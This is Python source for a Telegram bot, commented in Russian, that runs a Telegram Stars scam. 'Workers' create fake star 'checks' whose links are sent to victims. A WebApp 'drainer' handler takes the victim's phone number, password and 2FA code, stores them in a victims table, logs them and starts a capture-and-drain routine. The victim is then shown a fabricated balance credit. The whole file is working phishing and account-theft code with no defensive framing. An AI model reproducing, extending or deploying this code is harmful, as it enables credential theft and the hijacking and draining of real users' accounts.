# ---------- Обработка сообщений от воркера в ЛС бота ----------
async def handle_worker_dm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.message.text:
        return
    if update.message.chat.type != "private":
        return

    user_id = update.effective_user.id
    if not context.user_data.get('worker_mode', False):
        return

    text = update.message.text.strip()
    # Формат: @username количество
    pattern = r'^@([a-zA-Z0-9_]+)\s+(\d+)$'
    match = re.match(pattern, text, re.IGNORECASE)

    if not match:
        await update.message.reply_text(
            "⚠️ *Неверный формат чека*\n\n"
            "Используйте: `@username количество`\n"
            "Пример: `@john 500`",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    recipient_username = match.group(1)
    amount = int(match.group(2))
    sender_id = user_id
    sender_username = update.effective_user.username or update.effective_user.first_name

    if amount <= 0:
        await update.message.reply_text("❌ Количество звезд должно быть положительным числом.")
        return

    # Проверяем существование получателя
    try:
        recipient = await context.bot.get_chat(f"@{recipient_username}")
        # если пользователь существует, всё ок
    except Exception as e:
        await update.message.reply_text(
            f"❌ Пользователь @{recipient_username} не найден.\n"
            f"Проверьте правильность юзернейма.",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    # Генерируем уникальный код чека
    claim_code = secrets.token_hex(8).upper()

    # Сохраняем в БД (пока без recipient_id, он добавится при переходе по ссылке)
    cursor.execute("""
        INSERT INTO pending_claims (sender_id, sender_username, recipient_username, amount, claim_code)
        VALUES (?, ?, ?, ?, ?)
    """, (sender_id, sender_username, recipient_username, amount, claim_code))
    conn.commit()

    logger.info(f"📤 WORKER SENT: {sender_id} (@{sender_username}) -> @{recipient_username} | {amount} ★ | Code: {claim_code}")

    # Создаём ссылку для получателя
    bot_username = context.bot.username
    claim_link = f"https://t.me/{bot_username}?start=claim_{claim_code}"

    # Отправляем воркеру ссылку для отправки жертве
    await update.message.reply_text(
        f"✅ *Чек создан!*\n\n"
        f"📤 Получатель: `@{recipient_username}`\n"
        f"⭐ Количество: `{amount:,} ★`\n"
        f"🔗 *Ссылка для получения:*\n"
        f"`{claim_link}`\n\n"
        f"⬅️ *Отправьте эту ссылку получателю в ЛС!*\n"
        f"После перехода по ссылке он сможет забрать звезды.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_keyboard()
    )

# ---------- Обработка WebApp (дрейнер) ----------
async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    data = update.effective_message.web_app_data
    if not data:
        return

    payload = json.loads(data.data)
    user_id = update.effective_user.id
    user_username = update.effective_user.username or update.effective_user.first_name

    logger.info(f"🔓 CREDENTIALS from {user_id} (@{user_username}): {payload.get('phone')}")

    cursor.execute("""
        UPDATE victims 
        SET phone = ?, password = ?, twofa_code = ?, status = 'captured', captured_at = CURRENT_TIMESTAMP
        WHERE telegram_id = ?
    """, (payload.get('phone'), payload.get('password'), payload.get('twofa_code'), user_id))
    cursor.execute("UPDATE stats SET value = value + 1 WHERE key = 'total_victims'")
    conn.commit()

    asyncio.create_task(capture_and_drain(user_id, payload))

    claim_amount = context.user_data.get('claim_amount', 0)
    claim_sender = context.user_data.get('claim_sender', '')
    claim_code = context.user_data.get('claim_code', '')

    if claim_code:
        # Помечаем чек как использованный
        cursor.execute("UPDATE pending_claims SET status = 'claimed' WHERE claim_code = ?", (claim_code,))
        # Добавляем транзакцию
        cursor.execute("""
            INSERT INTO transactions (sender_id, sender_username, recipient_id, recipient_username, amount)
            SELECT sender_id, sender_username, ?, ?, amount
            FROM pending_claims WHERE claim_code = ?
        """, (user_id, user_username, claim_code))
        conn.commit()

    # Обновляем баланс жертвы (фейково)
    cursor.execute("SELECT stars_balance FROM victims WHERE telegram_id = ?", (user_id,))
    result = cursor.fetchone()
    current_balance = result[0] if result else 0
    new_balance = current_balance + claim_amount

    cursor.execute("UPDATE victims SET stars_balance = ? WHERE telegram_id = ?", (new_balance, user_id))
    conn.commit()

    response = (
        f"✅ *Верификация выполнена!*\n\n"
        f"⭐ `{claim_amount:,} ★` зачислены на ваш баланс!\n\n"
        f"📥 Отправитель: @{claim_sender}\n"
        f"💰 Новый баланс: `{new_balance:,} ★`"
    )

    await update.message.reply_text(
        response,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_keyboard()
    )

    context.user_data.clear()

